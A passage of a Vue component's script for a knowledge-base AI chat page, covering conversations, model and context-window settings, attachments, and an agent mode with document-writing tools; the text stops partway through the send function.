<script setup>
import { ref, reactive, nextTick, onMounted, onBeforeUnmount, computed, watch } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import {
  ChatDotRound, Plus, Delete, EditPen, ChatLineRound, Document,
  Paperclip, Link, ArrowDown, CopyDocument, Refresh, Reading, Promotion,
  Fold, Expand, VideoPause, Cpu, Search, Select
} from '@element-plus/icons-vue'
import ProviderLogo from '../components/ProviderLogo.vue'
import { useAuthStore } from '../store/auth'
import {
  aiAsk, aiAskStream, listAiModels, listConversations, createConversation, updateConversation,
  deleteConversation, batchDeleteConversations, listMessages
} from '../api/ai'
import MarkdownIt from 'markdown-it'
import { useRouter } from 'vue-router'
import { runLocalAgent } from '../utils/localAgent'
import { createMyDoc, updateMyDoc, listMyDocs } from '../api/kb'
import { listMyFiles } from '../api/file'
import api from '../api/request'
import { buildFlowchartGraph, flowchartHtml } from '../utils/flowchartGen'
import { createShareDoc, updateShareDoc, getShareDoc } from '../api/docShare'
import { shareDocPath, normalizeNavPath } from '../utils/docPath'
import { resolveDefaultSpaceId } from '../utils/spaceResolver'
import { agentCreateQuestions } from '../utils/questionGen'
import {
  estimateTokens, formatTokens, pickHistory, historyToText,
  COMPACT_INSTRUCTION, THINK_LEVELS, thinkPrefix,
} from '../utils/aiContext'
// ⚠️ 必须走 utils/prism 这一层包装，不能直接 `import Prism from 'prismjs'`：
// prismjs 是 CJS，构建后 `global` 不存在，语言组件又直接读写全局 Prism，
// 运行时会抛 "ReferenceError: Prism is not defined"。原因与顺序要求见 utils/prism.js。
import Prism from '../utils/prism'
import 'prismjs/components/prism-javascript'
import 'prismjs/components/prism-typescript'
import 'prismjs/components/prism-json'
import 'prismjs/components/prism-bash'
import 'prismjs/components/prism-python'
import 'prismjs/components/prism-java'
import 'prismjs/components/prism-sql'
import 'prismjs/components/prism-yaml'
import 'prismjs/components/prism-go'
import { escapeHtml } from '../utils/text'
import { compressImage } from '../utils/imageCompress'
import { recognizeLocal } from '../utils/localOcr'
import { parseDocument, DOC_EXTS } from '../utils/docParse'

const auth = useAuthStore()

const conversations = ref([])
const currentId = ref(null)
const convMessages = ref({})
const input = ref('')
const loadingSet = ref(new Set())
const loading = computed(() => (currentId.value ? loadingSet.value.has(currentId.value) : false))
const abortCtrl = ref(null)   // 当前请求的中断控制器（停止生成按钮用）
function stopAi() { abortCtrl.value?.abort() }
const bodyRef = ref(null)
const messages = computed(() => (currentId.value ? (convMessages.value[currentId.value] || []) : []))
const started = computed(() => messages.value.length > 0)

const mode = ref('kb')
const agentSteps = ref([])  // Agent 模式：步骤列表（累积展示，能看到它做了什么）
const agentStepsOpen = ref(true)  // 步骤折叠状态：执行中展开，完成后自动收起
// 一次 Agent 任务内的确认状态（WEB/AI 出题只问一遍，模型重试时不再弹）
const agentSession = ref({})
// 历史消息里的「执行过程」折叠状态（按消息索引，默认收起）
const msgStepsOpen = reactive({})

/**
 * 窗口用到 80% 时自动压缩一次。
 * 之所以放在「发送前」而不是定时器：只有真要发消息时上下文才会继续涨，
 * 空闲时压了也白压（还多花一次模型调用）。
 */
async function maybeAutoCompact() {
  if (ctxPct.value < AUTO_COMPACT_AT * 100) return
  if (compacting.value) return
  if (Date.now() - lastAutoCompact < 60000) return
  lastAutoCompact = Date.now()
  await compactContext(true)
}
// 高消耗发送确认的开关与阈值（管理员在「AI 模型管理 → 消息设置」配置）
const aiGuard = reactive({ enabled: true, imageThreshold: 2, textThreshold: 8000 })
async function loadAiGuard() {
  try {
    const { data } = await api.get('/public/ai-guard')
    if (data && typeof data.enabled === 'boolean') aiGuard.enabled = data.enabled
    if (data && Number(data.imageThreshold) > 0) aiGuard.imageThreshold = Number(data.imageThreshold)
    if (data && Number(data.textThreshold) > 0) aiGuard.textThreshold = Number(data.textThreshold)
  } catch { /* 读不到就用默认 */ }
}
const router = useRouter()
// Agent 询问用户（ask_user 工具）：拿不准时弹出来让用户拍板
const agentAsk = ref(null)      // { question, options, resolve }
const agentAskInput = ref('')
function askUser(question, options) {
  return new Promise((resolve) => {
    agentAskInput.value = ''
    agentAsk.value = { question, options: options || [], resolve }
  })
}
function answerAgentAsk(val) {
  const a = agentAsk.value
  if (!a) return
  const ans = String(val != null ? val : agentAskInput.value || '').trim()
  agentAsk.value = null
  agentAskInput.value = ''
  a.resolve(ans)
}
// ---------- 模型选择（模型由管理员在「AI 模型管理」页配置，这里只选不配）----------
// selectedModelId 为 '' 时不指定，走后端「默认模型」；选了具体 id 则本次请求强制用它
const modelList = ref([])
const selectedModelId = ref('')
async function loadModels() {
  try {
    const { data } = await listAiModels()
    modelList.value = data || []
    // 下拉里选过、但管理员把该模型停用了 → 回到默认模型
    if (selectedModelId.value && !modelList.value.some((m) => String(m.id) === String(selectedModelId.value))) {
      selectedModelId.value = ''
    }
  } catch {
    modelList.value = []
  }
}

// ---------- 附件：内容在本地解析（图片走内置 OCR、文本文件直接读），随提问一起发给 AI ----------
// 与移动端 MobileAiChat 同源能力：解析全在浏览器完成，零后端改动。
const attachments = ref([])       // [{ id, name, size, kind: 'image'|'text', text }]
const fileInput = ref(null)
const attBusy = ref(false)
const ATT_TEXT_MAX = 200 * 1024   // 文本文件上限 200KB
const ATT_SNIPPET = 6000          // 单附件注入提问的内容截断长度
// ---------- 调用可视化：本次实际用的模型 / 耗时 / token 用量，回答下方一行展示 ----------
function buildMeta(data) {
  if (!data) return null
  const name = data.modelName || data.model || ''
  if (!name && data.latencyMs == null) return null
  // reasoning：思考型模型（DeepSeek / GLM 思考版）的思考过程，前端折叠展示；不落历史，仅本次回答可见
  return { name, latencyMs: Number(data.latencyMs) || 0, usage: data.usage || null, reasoning: data.reasoning || null }
}
function fmtMs(ms) {
  if (!ms) return ''
  return ms >= 1000 ? (ms / 1000).toFixed(2) + 's' : ms + 'ms'
}
function onModelChange() {
  // 只影响后续提问：切换模型不会改写已有回答（历史回答保留当时的模型与耗时）
  ElMessage.info(selectedModelId.value ? '下一句将使用所选模型' : '下一句将使用默认模型')
}

// 顶部模型选择器（WorkBuddy 风格）：触发器显示当前模型 + 品牌图标，弹层列表带勾选
const currentModel = computed(() =>
  modelList.value.find((m) => String(m.id) === String(selectedModelId.value)) || null)
const currentModelLabel = computed(() => currentModel.value?.name || '默认模型')

// ---------- 上下文预算 / 用量环 / 思考强度 / 压缩 ----------
// 窗口大小由管理员在「AI 模型管理」里按模型配置（64K~1M 差得很远，写死只会两头不讨好）
const effectiveModel = computed(() =>
  currentModel.value || modelList.value.find((m) => m.isDefault) || modelList.value[0] || null)
// 模型本身能吃的最大窗口（管理员配置，作为上限）
const modelMaxWindow = computed(() => Number(effectiveModel.value?.contextWindow) || 128000)
/**
 * 用户可把窗口「调小」用（模型 1M 但只想用 200K：省 token、控成本、避免长上下文变慢）。
 * 只能往下调、不能超过模型上限，所以取 min。0 / 空 = 跟随模型最大值。
 * 按模型 id 分别记，换模型不会互相污染。
 */
const CTX_SET_KEY = 'kb_ai_ctx_window'
const ctxWindowSet = ref(0)
const ctxWindow = computed(() => {
  const max = modelMaxWindow.value
  const v = Number(ctxWindowSet.value) || 0
  return v > 0 ? Math.min(Math.max(v, 8000), max) : max
})
// 窗口档位说明（对齐截图里的「1M 上下文·超长」那种语义）
const ctxWindowLabel = computed(() => {
  const w = ctxWindow.value
  if (w >= modelMaxWindow.value) return '模型上限'
  if (w >= 500000) return '超长'
  if (w >= 128000) return '长'
  if (w >= 32000) return '标准'
  return '精简'
})
function loadCtxWindow() {
  try {
    const raw = localStorage.getItem(CTX_SET_KEY)
    const map = raw ? JSON.parse(raw) : {}
    const id = effectiveModel.value?.id || 'default'
    ctxWindowSet.value = Number(map[id]) || 0
  } catch { ctxWindowSet.value = 0 }
}
function saveCtxWindow() {
  try {
    const raw = localStorage.getItem(CTX_SET_KEY)
    const map = raw ? JSON.parse(raw) : {}
    const id = effectiveModel.value?.id || 'default'
    if (ctxWindowSet.value > 0) map[id] = ctxWindowSet.value
    else delete map[id]
    localStorage.setItem(CTX_SET_KEY, JSON.stringify(map))
  } catch { /* 存不了就算了，只影响下次进页面 */ }
}
watch(effectiveModel, () => loadCtxWindow())


const activeMessages = computed(() => (currentId.value ? (convMessages.value[currentId.value] || []) : []))
const historyTokens = computed(() => activeMessages.value.reduce((n, m) => n + estimateTokens(m.content), 0))
const inputTokens = computed(() => estimateTokens(input.value))
// 用量拆成几段，和「已用总量」对得上，也能看出到底是谁把窗口吃掉了
const ctxParts = computed(() => {
  const parts = [{ name: '系统提示词', value: 120, color: '#6366f1' }]
  // Agent 模式的工具手册（TOOL_MANUAL）本身就有上千 token，且每步都会带上
  if (mode.value === 'agent') parts.push({ name: '工具与技能', value: 1800, color: '#10b981' })
  parts.push({ name: '对话消息', value: historyTokens.value, color: '#f59e0b' })
  if (inputTokens.value > 0) parts.push({ name: '当前输入', value: inputTokens.value, color: '#a855f7' })
  return parts
})
const usedTokens = computed(() => ctxParts.value.reduce((n, p) => n + p.value, 0))
const ctxPct = computed(() => Math.min(100, Math.round((usedTokens.value / ctxWindow.value) * 100)))
const ctxColor = computed(() => (ctxPct.value >= 85 ? '#dc2626' : ctxPct.value >= 60 ? '#d97706' : '#16a34a'))
const ctxRing = computed(() => {
  const c = 2 * Math.PI * 15.5
  return `${(ctxPct.value / 100) * c} ${c}`
})

// 思考强度：作用于提示词而非厂商私有参数，所以对所有模型都成立（原生 reasoning 参数各家不统一）
const think = ref(localStorage.getItem('kb_ai_think') || 'normal')
watch(think, (v) => {
  localStorage.setItem('kb_ai_think', v)
  const t = THINK_LEVELS.find((x) => x.value === v)
  ElMessage.success('思考强度：' + (t ? t.label : v))
})

const compacting = ref(false)
/** 窗口用到这个比例就自动压一次（不必等用户发现「怎么开始变慢/报超长」） */
const AUTO_COMPACT_AT = 0.8
let lastAutoCompact = 0

async function compactContext(auto = false) {
  const msgs = activeMessages.value.filter((m) => m && m.content)
  if (msgs.length < 4) { if (!auto) ElMessage.info('对话还短，不需要压缩'); return }
  compacting.value = true
  try {
    const text = msgs.map((m) => (m.role === 'user' ? '用户：' : '助手：') + String(m.content)).join('\n\n')
    const { data } = await aiAsk(COMPACT_INSTRUCTION + text, null, 'general', {
      modelId: selectedModelId.value || null,
    })
    const summary = String((data && data.answer) || '').trim()
    if (!summary) { ElMessage.warning('压缩失败：模型没有返回内容'); return }
    // 留最后两条原文做衔接，其余全部收进摘要——否则摘要完立刻接不上当前话题
    const keep = msgs.slice(-2)
    convMessages.value[currentId.value] = [
      { role: 'assistant', content: '【历史摘要】' + summary, mode: 'general', compacted: true },
      ...keep,
    ]
    ElMessage.success(auto
      ? `上下文快满了，已自动压缩：${msgs.length} 条 → 摘要 + 最近 ${keep.length} 条`
      : `已压缩：${msgs.length} 条 → 摘要 + 最近 ${keep.length} 条`)
  } catch (e) {
    if (!auto) ElMessage.error('压缩失败：' + ((e && e.response && e.response.data && e.response.data.error) || (e && e.message) || '未知错误'))
  } finally {
    compacting.value = false
  }
}
const currentModelProvider = computed(() => currentModel.value?.provider || '')
function pickModel(id) {
  if (String(selectedModelId.value) === String(id)) return
  selectedModelId.value = id
  onModelChange()
}
function fmtTokens(u) {
  if (!u) return ''
  // OpenAI 兼容格式：prompt_tokens / completion_tokens / total_tokens
  const inp = u.prompt_tokens ?? u.promptTokens ?? u.input_tokens
  const out = u.completion_tokens ?? u.completionTokens ?? u.output_tokens
  const total = u.total_tokens ?? u.totalTokens
  if (total == null && inp == null && out == null) return ''
  const t = total != null ? total : ((inp || 0) + (out || 0))
  let s = t + ' tokens'
  if (inp != null || out != null) s += `（输入 ${inp || 0} / 输出 ${out || 0}）`
  return s
}

const showScrollBtn = ref(false)
// 分段滑块位置：必须与按钮个数同步（kb=0 / general=1 / agent=2），
// 之前只算了 2 个位置，加了 Agent 按钮后遮罩就错位了。
const MODE_INDEX = { kb: 0, general: 1, agent: 2 }
const thumbStyle = computed(() => ({ transform: `translateX(${(MODE_INDEX[mode.value] || 0) * 100}%)` }))

// 侧栏：宽屏 = 折叠进文档流（记忆到 localStorage）；窄屏 = 覆盖式抽屉，默认收起
const SIDEBAR_KEY = 'kb_ai_sidebar_collapsed'
const sidebarCollapsed = ref(localStorage.getItem(SIDEBAR_KEY) === '1')
const isNarrow = ref(false)
const drawerOpen = ref(false)
let mqNarrow = null
function onNarrowChange(e) {
  isNarrow.value = e.matches
  if (!e.matches) drawerOpen.value = false
}
function closeDrawerOnMobile() {
  if (isNarrow.value) drawerOpen.value = false
}
const sideToggleTip = computed(() => {
  if (isNarrow.value) return drawerOpen.value ? '收起历史会话' : '历史会话'
  return sidebarCollapsed.value ? '展开历史会话' : '收起历史会话'
})
function toggleSidebar() {
  if (isNarrow.value) { drawerOpen.value = !drawerOpen.value; return }
  sidebarCollapsed.value = !sidebarCollapsed.value
  localStorage.setItem(SIDEBAR_KEY, sidebarCollapsed.value ? '1' : '0')
}

const creating = ref(false)
const renamingId = ref(null)
const renameTitle = ref('')
const showInstructionsDrawer = ref(false)
const instructionsForm = ref({ id: null, title: '', instructions: '' })
const savingInstructions = ref(false)
const loadingMessages = ref(false)
const loadingConversations = ref(false)

const STORAGE_KEY = 'kb_ai_current_conversation'

const suggestions = [
  '如何发布一篇文章？',
  '知识库支持哪些内容格式？',
  '怎么查看我的积分明细？',
  '帮我总结一下知识库的常见用法',
  '知识库里有哪些关于新员工入职的内容？',
  '最近更新的文档有哪些？',
  '帮我看看还差哪些勋章没拿到',
  '怎么把文档分享给同事？',
]
// 多一点轮换：每次进入随机抽 4 条，避免永远是同一套开场
const rotateSugs = (arr, n = 4) => [...arr].sort(() => Math.random() - 0.5).slice(0, n)

// 空状态文案必须跟着模式走：切到「通用」后如果还挂着「我是知识库 AI 助手 / 基于知识库检索作答」
// 和一堆知识库相关的推荐问题，用户会以为模式没生效 —— 这正是「选了通用还感觉基于知识库」的来源之一。
const generalSuggestions = [
  '用三句话解释什么是向量数据库',
  '帮我把这段话润色得更正式',
  '推荐几本讲系统设计的好书',
  '写一个 Python 读取 Excel 的例子',
  '把这段会议纪要提炼成三个要点',
  '帮我写一封项目延期的通知邮件',
  '解释一下什么是幂等性，举个例子',
  '给我的周报起几个标题',
]
const agentSuggestions = [
  '帮我写一篇关于「消防演练注意事项」的文档，存进知识库',
  '帮我出 5 道关于请假流程的单选题，加进题库',
  '审查我最近的一篇文档，指出问题并优化',
  '把知识库里关于报销的内容找出来，对比有没有矛盾',
  '整理一篇「远程办公设备清单」并存为文档',
  '出 3 道关于信息安全的判断题放进我的题库',
  '帮我检查最近的文档里有没有过期日期',
]
const emptyCopy = computed(() => {
  if (mode.value === 'agent') {
    return {
      title: '你好，我是 Agent',
      tip: '我会自己检索资料、读写文档——你说目标，我来干活（写好的文档会存进知识库）',
      features: [
        { icon: 'Search', text: '自主检索' },
        { icon: 'EditPen', text: '写 / 改文档' },
        { icon: 'Cpu', text: '多步执行' },
      ],
      sugs: rotateSugs(agentSuggestions),
    }
  }
  if (mode.value === 'general') {
    return {
      title: '你好，我是通用 AI 助手',
      tip: '不检索知识库，直接凭通用知识作答',
      features: [
        { icon: 'ChatDotRound', text: '自由问答' },
        { icon: 'EditPen', text: '写作润色' },
        { icon: 'Cpu', text: '编程协助' },
      ],
      sugs: rotateSugs(generalSuggestions),
    }
  }
  return {
    // kb 模式保持原有身份文案（2026-10-06 用户确认：知识库模式照旧，新口径只作用于通用模式）
    title: '你好，我是知识库 AI 助手',
    tip: '基于知识库检索作答，也能陪你日常聊聊',
    features: [
      { icon: 'Reading', text: '知识检索' },
      { icon: 'EditPen', text: '总结写作' },
      { icon: 'ChatDotRound', text: '日常问答' },
    ],
    sugs: suggestions,
  }
})

const currentConversation = computed(() =>
  conversations.value.find((c) => c.id === currentId.value)
)

// 用户头像：auth 有 avatar 用图片，否则按用户名 hash 取渐变色 + 首字母
const userName = computed(() => auth.user?.displayName || auth.user?.username || '我')
const userInitial = computed(() => {
  const n = (userName.value || '我').charAt(0)
  return n ? n.toUpperCase() : '我'
})
const userAvatar = computed(() => auth.user?.avatar || '')
function hashCode(s) {
  let h = 0
  for (let i = 0; i < s.length; i++) h = ((h << 5) - h) + s.charCodeAt(i)
  return Math.abs(h)
}
const userGradient = computed(() => {
  const palette = [
    'linear-gradient(135deg,#6366f1,#4338ca)',
    'linear-gradient(135deg,#0ea5e9,#0369a1)',
    'linear-gradient(135deg,#10b981,#047857)',
    'linear-gradient(135deg,#f59e0b,#b45309)',
    'linear-gradient(135deg,#ec4899,#9d174d)',
    'linear-gradient(135deg,#8b5cf6,#6d28d9)',
  ]
  const name = userName.value || 'me'
  return palette[hashCode(name) % palette.length]
})

function scrollToBottom() {
  nextTick(() => {
    if (bodyRef.value) bodyRef.value.scrollTop = bodyRef.value.scrollHeight
  })
}
function onBodyScroll() {
  const el = bodyRef.value
  if (!el) return
  showScrollBtn.value = (el.scrollHeight - el.scrollTop - el.clientHeight) > 140
}

async function loadConversations() {
  loadingConversations.value = true
  try {
    const { data } = await listConversations()
    conversations.value = data || []
  } catch {
    ElMessage.error('加载会话列表失败')
  } finally {
    loadingConversations.value = false
  }
}

async function loadMessages(id, { silent = false } = {}) {
  if (!id) return
  if (convMessages.value[id]) { if (!silent) scrollToBottom(); return }
  loadingMessages.value = true
  try {
    const { data } = await listMessages(id)
    convMessages.value[id] = (data || []).map((m) => ({ role: m.role, content: m.content, sources: m.sources || [], mode: m.mode || 'kb' }))
  } catch {
    ElMessage.error('加载历史消息失败')
    convMessages.value[id] = []
  } finally {
    loadingMessages.value = false
  }
  if (!silent) scrollToBottom()
}

async function selectConversation(id) {
  closeDrawerOnMobile()
  if (currentId.value === id) return
  currentId.value = id
  localStorage.setItem(STORAGE_KEY, String(id))
  await loadMessages(id)
  scrollToBottom()
}

async function newConversation() {
  if (creating.value) return
  creating.value = true
  try {
    const { data } = await createConversation('新对话')
    convMessages.value[data.id] = []
    conversations.value.unshift(data)
    currentId.value = data.id
    localStorage.setItem(STORAGE_KEY, String(data.id))
    input.value = ''
    closeDrawerOnMobile()
  } catch {
    ElMessage.error('创建会话失败')
  } finally {
    creating.value = false
  }
}

/**
 * 轻量 Markdown → HTML：Agent 写/改文档时用（文档正文存的是富文本 HTML）。
 * 只支持标题 / 列表 / 加粗 / 代码块 / 段落 —— 够 Agent 产出用，且零依赖。
 */
function mdToHtml(md) {
  const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')   // 引号必须转义：alt/src 属性位置可被注入 onerror（外部复审 2026-10-08）
  const out = []
  let inCode = false
  let inList = false
  const closeList = () => { if (inList) { out.push('</ul>'); inList = false } }
  for (const raw of String(md || '').split('\n')) {
    const line = raw.replace(/\s+$/, '')
    if (/^```/.test(line)) {
      closeList()
      out.push(inCode ? '</pre>' : '<pre>')
      inCode = !inCode
      continue
    }
    if (inCode) { out.push(esc(line)); continue }
    // 图片：![说明](url) —— Agent 用 list_my_files 拿到 url 后这样插入
    const img = line.match(/^!\[([^\]]*)\]\(([^)\s]+)\)\s*$/)
    if (img) { closeList(); out.push(`<img src="${esc(img[2])}" alt="${esc(img[1])}"/>`); continue }
    // 视频 / 音频：@[video](url) / @[audio](url)（HTML 标签会被转义，故用专门语法）
    const media = line.match(/^@\[(video|audio)\]\(([^)\s]+)\)\s*$/)
    if (media) {
      closeList()
      out.push(`<${media[1]} src="${esc(media[2])}" controls></${media[1]}>`)
      continue
    }
    const h = line.match(/^(#{1,4})\s+(.*)$/)
    if (h) { closeList(); out.push(`<h${h[1].length}>${esc(h[2])}</h${h[1].length}>`); continue }
    const li = line.match(/^\s*[-*]\s+(.*)$/)
    if (li) { if (!inList) { out.push('<ul>'); inList = true } out.push(`<li>${esc(li[1])}</li>`); continue }
    closeList()
    if (!line.trim()) continue
    out.push(`<p>${esc(line).replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')}</p>`)
  }
  closeList()
  if (inCode) out.push('</pre>')
  return out.join('')
}

/**
 * Agent 模式：ReAct 编排 + 本地工具（检索 / 读文档 / 写文档 / 改文档 / 跳转）。
 * 与移动端同一套引擎（utils/localAgent），走「通用」模式的无状态调用，不进后端会话。
 */
/** 会话标题：取第一行有效文字，剥掉【】包装与思考残留，控制在 20 字内 */
function cleanTitle(raw) {
  let t = String(raw || '').split('\n').find((l) => l.trim()) || '新对话'
  t = t.replace(/【[^】]*】/g, ' ').replace(/<[^>]+>/g, ' ')
       .replace(/\bthink\b|思考过程|reasoning/gi, ' ').replace(/\s+/g, ' ').trim()
  return (t || '新对话').slice(0, 20)
}

async function sendAgent(raw) {
  if (!raw) { ElMessage.warning('请输入任务描述'); return }
  if (loading.value) return

  let convId = currentId.value
  // 当前会话还是空的就直接复用，避免「发一次任务多一个空壳会话」
  if (!convId && conversations.value.length && !(convMessages.value[currentId.value] || []).length) {
    convId = currentId.value = conversations.value[0].id
  }
  if (!convId) {
    creating.value = true
    try {
      const { data } = await createConversation(cleanTitle(raw))
      convMessages.value[data.id] = []
      conversations.value.unshift(data)
      currentId.value = data.id
      localStorage.setItem(STORAGE_KEY, String(data.id))
      convId = data.id
    } catch {
      ElMessage.error('创建会话失败')
      return
    } finally {
      creating.value = false
    }
  }

  // 历史按模型窗口的 35% 取（其余留给工具手册、资料与回答），不再写死「6 条 × 400 字」
  const budget = Math.max(2000, Math.floor(ctxWindow.value * 0.35))
  const history = historyToText(pickHistory(convMessages.value[convId] || [], budget))
  const task = thinkPrefix(think.value) + (history ? `【最近的对话】\n${history}\n\n【本次任务】${raw}` : raw)

  convMessages.value[convId] = [...(convMessages.value[convId] || []), { role: 'user', content: raw }]
  input.value = ''
  attachments.value = []
  loadingSet.value.add(convId)
  agentSteps.value = []
  agentStepsOpen.value = true
  agentSession.value = {}
  await nextTick()
  scrollToBottom()

  try {
    abortCtrl.value = new AbortController()
    const r = await runLocalAgent({
      question: task,
      ask: async (t, sig) => {
        const { data } = await aiAsk(t, null, 'general', {
          modelId: selectedModelId.value || null, signal: sig || abortCtrl.value.signal
        })
        return (data && data.answer) || ''
      },
      onStep: (s) => { agentSteps.value = [...agentSteps.value, s] },
      signal: abortCtrl.value.signal,
      hooks: {
        askUser,
        listMyFiles: async () => {
          try {
            const { data } = await listMyFiles()
            const rows = (data || []).slice(0, 40).map((f) => {
              const kind = /^image/i.test(f.contentType || '') ? '图片'
                : /^(audio|video)/i.test(f.contentType || '') ? '音视频' : '文件'
              return `- [${kind}] ${f.name} → ${f.url}`
            })
            return rows.length ? `我的文件共 ${rows.length} 个：\n` + rows.join('\n') : '我还没有上传文件'
          } catch (e) {
            return '列出文件失败：' + ((e && e.message) || e)
          }
        },
        navigate: async (path) => {
          if (!path || !String(path).startsWith('/')) return '跳转失败：路径不合法'
          try {
            const fixed = await normalizeNavPath(path, { mobile: false })
            router.push(fixed)
            return fixed === path
              ? '已跳转到 ' + path
              : `已跳转到 ${fixed}（原路径 ${path} 不存在，已按文档 id 纠正）`
          } catch (e) { return '跳转失败：' + ((e && e.message) || e) }
        },
        listMyDocs: async () => {
          try {
            const { data } = await listMyDocs()
            const rows = (data || []).slice(0, 30).map((d) => `- [${d.id}] ${d.title || '无标题'}`)
            return rows.length ? `我的文档共 ${rows.length} 篇：\n` + rows.join('\n') : '我还没有自己的文档'
          } catch (e) { return '列出文档失败：' + ((e && e.message) || e) }
        },
        insertFlowchart: async ({ title, docId, nodes, edges }) => {
          if (auth.isDemo) return '演示账号是只读的，无法生成文档'
          try {
            const graph = buildFlowchartGraph(nodes, edges)
            if (!graph.nodes.length) return '没有有效节点，未生成流程图'
            const html = flowchartHtml(title, graph)
            const sid = await resolveDefaultSpaceId()
            if (!sid) return '没有可写入的共享空间'
            const tip = `（${graph.nodes.length} 个节点 / ${graph.edges.length} 条连线）`
            // docId 来自模型输出：必须是整数，防路径拼接出非预期端点（外部复审 2026-10-08）
            const docIdNum = Number(docId)
            if (docId && !Number.isInteger(docIdNum)) return '文档 id 非法'
            const t = String(title || '流程图').slice(0, 80)
            if (docId) {
              const { data } = await getShareDoc(sid, docId)
              await updateShareDoc(sid, docId, { content: String(data.content || '') + html })
              return `已在共享文档《${data.title || docId}》中生成流程图${tip}。`
                + `打开地址：${shareDocPath(sid, docId, false)}`
            }
            const { data } = await createShareDoc(sid, { title: t, content: html })
            return `已新建共享文档《${t}》并生成流程图${tip}（id=${data && data.id}）。`
              + `打开地址：${shareDocPath(sid, data && data.id, false)}`
          } catch (e) {
            return '生成流程图失败：' + ((e && e.message) || e)
          }
        },
        createQuestions: (args) => agentCreateQuestions(args, { askUser, isDemo: auth.isDemo, session: agentSession.value }),
        createDoc: async ({ title, content, status }) => {
          // 演示账号后端会 403，提前给出明确原因，免得 Agent 白跑几步再失败
          if (auth.isDemo) return '演示账号是只读的，无法创建文档（请用正式账号登录后再试）'
          try {
            const isDraft = status === 'draft'
            const { data } = await createMyDoc({
              title, content: mdToHtml(content), status: isDraft ? 'DRAFT' : 'PENDING_REVIEW'
            })
            const st = (data && data.status) || (isDraft ? 'DRAFT' : 'PENDING_REVIEW')
            if (st === 'PUBLISHED') return '已发布《' + title + '》（id=' + (data && data.id) + '）'
            if (st === 'DRAFT') return '已存为草稿《' + title + '》（id=' + (data && data.id) + '，仅自己可见）'
            return '已提交审核《' + title + '》（id=' + (data && data.id) + '，等待管理员通过后才公开）'
          } catch (e) { return '新建失败：' + ((e && e.message) || e) }
        },
        updateDoc: async ({ id, title, content }) => {
          if (auth.isDemo) return '演示账号是只读的，无法修改文档（请用正式账号登录后再试）'
          try {
            const body = { content: mdToHtml(content) }
            if (title) body.title = title
            const { data } = await updateMyDoc(id, body)
            const st = data && data.status
            return '已更新文档《' + ((data && data.title) || title || id) + '》（id=' + id + '）' + (st === 'PENDING_REVIEW' ? '（改动已提交审核）' : '')
          } catch (e) { return '更新失败：' + ((e && e.message) || e) }
        }
      }
    })
    // steps 跟着消息存下来：否则执行过程只在 loading 里，回答一出来就再也看不到
    convMessages.value[convId] = [...convMessages.value[convId], {
      role: 'assistant', content: r.answer, mode: 'agent', steps: r.steps || [],
    }]
  } catch (e) {
    const msg = String((e && e.message) || e || '')
    // 点「停止」或切走页面时 axios 抛的是取消，不是失败——写成「执行失败」只会让人以为坏了
    const canceled = /cancel(ed|elled)|abort/i.test(msg) || (e && (e.name === 'CanceledError' || e.code === 'ERR_CANCELED'))
    convMessages.value[convId] = [...convMessages.value[convId], {
      role: 'assistant',
      content: canceled ? '（已停止）' : 'Agent 执行失败：' + (msg || '未知错误'),
      mode: 'agent',
    }]
  } finally {
    agentStepsOpen.value = false   // 完成后自动收起步骤（数据保留，可点「展开」回看）
    loadingSet.value.delete(convId)
    abortCtrl.value = null
    await nextTick()
    scrollToBottom()
  }
}

async function send(text) {
  const raw = (text ?? input.value).trim()
  const hasAtt = attachments.value.length > 0
  if (!raw && !hasAtt) { ElMessage.warning('请输入内容'); return }
  if (loading.value) return
  await maybeAutoCompact()
  // Agent 模式走独立链路（ReAct + 本地工具），不进后端会话
  if (mode.value === 'agent') { await sendAgent(raw); return }

  // 「识文字」模式的图片先本地 OCR（文字拼进提问，离线也能用）；「看图」模式的收集为多模态 images
  for (const a of attachments.value) {
    if (a.kind !== 'image' || a.mode !== 'ocr' || a.text) continue
    try {
      ElMessage.info('正在本地识别「' + a.name + '」…')
      const r = await recognizeLocal(a.file || a.dataUrl, () => {}, { table: true })
      a.text = (r && r.text ? String(r.text) : '').trim()
      if (!a.text) ElMessage.warning('「' + a.name + '」没有识别出文字，已跳过')
    } catch (err) {
      ElMessage.warning('「' + a.name + '」本地识别失败：' + ((err && err.message) || err))
    }
  }
  const fileNames = attachments.value.map((a) => a.name)
  const images = attachments.value.filter((a) => a.kind === 'image' && a.mode === 'vision' && a.dataUrl).map((a) => a.dataUrl)
  const q = buildQuestionWithAttachments(raw || (images.length ? '请识别并说明这些图片的内容' : ''))

  // 高消耗确认：图片走多模态约 850 tokens/张，长文本约 1.5 tokens/汉字。
  // 开关与阈值由管理员在「AI 模型管理 → 消息设置」里配置（/api/public/ai-guard），读不到用默认值。
  const textLen = attachments.value.reduce((n, a) => n + (a.text ? a.text.length : 0), 0) + raw.length
  const estTokens = images.length * 850 + Math.round(textLen * 1.5)
  if (aiGuard.enabled && (images.length >= aiGuard.imageThreshold || textLen >= aiGuard.textThreshold)) {
    try {
      await ElMessageBox.confirm(
        `本次将发送 ${images.length} 张图片、约 ${textLen} 字文本，预计消耗约 ${estTokens.toLocaleString()} tokens。`,
        '确认消耗',
        { confirmButtonText: '继续发送', cancelButtonText: '取消', type: 'warning' }
      )
    } catch { return }
  }
  const titleBase = raw || ('附件：' + fileNames.join('、'))

  let convId = currentId.value
  if (!convId) {
    creating.value = true
    try {
      const { data } = await createConversation(titleBase)
      convMessages.value[data.id] = []
      conversations.value.unshift(data)
      currentId.value = data.id
      localStorage.setItem(STORAGE_KEY, String(data.id))
      convId = data.id
    } catch {
      ElMessage.error('创建会话失败')
      return
    } finally {
      creating.value = false
    }
  }

  const curUser = convMessages.value[convId] || []
  convMessages.value[convId] = [...curUser, { role: 'user', content: raw, files: fileNames.length ? fileNames : null }]

  const conv = conversations.value.find((c) => c.id === convId)
  if (conv && (conv.title === '新对话' || !conv.title)) {
    const newTitle = titleBase.length > 20 ? titleBase.slice(0, 20) + '…' : titleBase
    conv.title = newTitle
    updateConversation(convId, { title: newTitle }).catch(() => {})
  }

  input.value = ''
  attachments.value = []
  loadingSet.value.add(convId)
  await nextTick()
  scrollToBottom()

  try {
    abortCtrl.value = new AbortController()
    // 思考强度作用于提示词：普通问答也带上，保持和 Agent 模式一致的风格控制
    const question = thinkPrefix(think.value) + q

